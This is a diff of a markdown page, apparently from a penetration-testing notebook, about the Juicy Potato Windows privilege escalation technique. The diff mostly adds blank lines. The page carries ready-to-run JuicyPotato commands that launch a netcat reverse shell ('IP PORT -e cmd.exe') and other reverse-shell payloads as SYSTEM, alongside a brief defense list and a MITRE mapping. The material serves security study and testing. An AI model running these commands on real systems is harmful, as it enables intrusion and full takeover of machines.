@@ -41,11 +41,15 @@ From a technical perspective, Juicy Potato works by creating a fake service and 
 
 From a business perspective, this technique can be used by attackers to gain access to sensitive data and perform other malicious activities. By gaining SYSTEM-level privileges, attackers can install malware, exfiltrate data, or perform other actions that could be detrimental to the business. It is important for organizations to be aware of this technique and take steps to protect against it.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable Windows system
 
 1. Juicy Potato tool
+
+ 
 
 ## Defense
 
@@ -55,19 +59,31 @@ From a business perspective, this technique can be used by attackers to gain acc
 
 1. Restrict access to sensitive systems and data to only authorized users
 
+ 
+
 ## Objectives
 
 1. Gain SYSTEM-level privileges on a Windows system
 
 1. Install malware or perform other malicious activities
 
+ 
+
 # Instructions
 
 1. To check the privileges of the service account, run the command 'whoami /priv' in a PowerShell prompt.
 
+ 
+
+
+
 **Code**: [[whoami /priv]]
 
+
+
 > This command will display a list of privileges that are currently assigned to the service account. The two privileges to look for are **SeImpersonate** and **SeAssignPrimaryToken**. These privileges are required for a service account to be able to authenticate and impersonate a client, which is necessary for some applications to function properly.
+
+
 
 **Command** ([[Check User Privileges]]):
 
@@ -75,9 +91,17 @@ From a business perspective, this technique can be used by attackers to gain acc
 whoami /priv
 ```
 
+
+
 2. JuicyPotato is a tool used to perform privilege escalation on Windows systems. The -l flag is used to specify the local port to listen on. The -p flag is used to specify the path to the executable to be run with SYSTEM privileges. The -a flag is used to specify the arguments to be passed to the executable. The -t flag is used to specify the type of token to use. The -c flag is used to specify the CLSID of the DCOM object to use for the COM activation. To run JuicyPotato, open a command prompt and navigate to the directory where JuicyPotato is located. Then execute the command with the appropriate flags and arguments.
 
+ 
+
+
+
 **Code**: [[JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upl]]
+
+
 
 > -l: Specifies the local port to listen on.
 -p: Specifies the path to the executable to be run with SYSTEM privileges.
@@ -85,11 +109,17 @@ whoami /priv
 -t: Specifies the type of token to use.
 -c: Specifies the CLSID of the DCOM object to use for the COM activation.
 
+
+
 **Command** ([[JuicyPotato.exe -l 9999]]):
 
 ```bash
 JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
 ```
+
+
+
+
 
 **Command** ([[JuicyPotato.exe -l 1340]]):
 
@@ -97,11 +127,17 @@ JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.
 JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
 ```
 
+
+
+
+
 **Command** ([[JuicyPotato.exe -l 1337]]):
 
 ```bash
 JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -131,3 +167,5 @@ JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-45
 - [[EoP - Impersonation Privileges]]
 - [[Juicy Potato (Abusing the golden privileges)]]
 - [[Windows - Privilege Escalation]]
+
+
